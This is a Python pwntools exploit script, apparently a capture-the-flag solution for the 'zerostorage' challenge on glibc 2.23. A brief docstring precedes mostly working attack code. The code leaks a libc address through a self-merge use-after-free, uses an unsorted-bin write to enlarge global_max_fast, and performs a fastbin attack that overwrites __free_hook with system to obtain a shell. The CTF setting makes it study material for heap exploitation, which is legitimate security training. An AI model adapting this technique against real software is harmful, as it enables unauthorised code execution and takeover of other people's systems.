"""
Offset from leaked unsorted bin to libc base = 0x3aabb8
Offset from global_max_fast to libc base = 0x3ac8c0

The essence of this attack is to modify the value of global_max_fast to be arbitrarily large such that any freed chunk will become a fast chunk.
Then we perform a fastbin attack - modify the fd pointer of the free fast chunk - to edit __malloc_hook or __free_hook.
How we control and edit these pointers are dependent on the logic of the given program.
"""
from pwn import *

s = process("./zerostorage", env = {"LD_PRELOAD": "./libc-2.23.so"})
elf = ELF("./zerostorage")
libc = ELF("./libc-2.23.so")

def insert(size, payload):
    s.sendline("1")
    s.sendline(str(size))
    s.sendlineafter("Enter your data: ", payload)
    
def edit(idx ,size, payload):
    s.sendline("2")
    s.sendlineafter("Entry ID: ", str(idx))
    s.sendline(str(size))
    s.sendlineafter("Enter your data: ", payload)

def merge(idx_to, idx_from):
    s.sendline("3")
    s.sendline(str(idx_from))
    s.sendlineafter("Merge to Entry ID: ", str(idx_to))

def delete(idx): 
    s.sendline("4")
    s.sendlineafter("Entry ID: ", str(idx))

def view(idx):
    s.sendline("5")
    s.sendlineafter("Entry ID: ", str(idx))
    s.recvuntil(":\n")
    return s.recvline().strip(b"\n")

def list():
    s.sendline("6")

insert(4, b"aaaa")
insert(0xf8, b"1"*0xf8)

merge(0, 0)         # entry 2
leaked = view(2)
leaked = u64(leaked.ljust(8, b"\x00"))
libc.address = leaked - 0x3aabb8
global_max_fast = libc.address + 0x3ac8c0
one_shot = 0xd806f + libc.address

log.info("Leaked unsorted bin: {}".format(hex(leaked)))
log.info("Libc base: {}".format(hex(libc.address)))
log.info("global_max_fast: {}".format(hex(global_max_fast)))
log.info("__malloc_hook: {}".format(hex(libc.symbols["__malloc_hook"])))

edit(2, 0x10, b"A"*0x8 + p64(global_max_fast - 0x10))           
insert(8, b"/bin/sh\x00")  # entry 0, trigger the write to global_max_fast



merge(1, 1)         # entry 3

payload = p64(libc.symbols["__free_hook"]-0x69) + p64(0x0) + b"A"*(0x1e0-1)
edit(3, 0x1f0, payload)
insert(0x1f0, b"x"*(0x1f0-1))

payload = b"A"*0x59 + p64(libc.symbols["system"])
payload += b"\x00"*(0x1f0 - 1 - len(payload))
insert(0x1f0, payload)
#delete(0)

s.interactive()
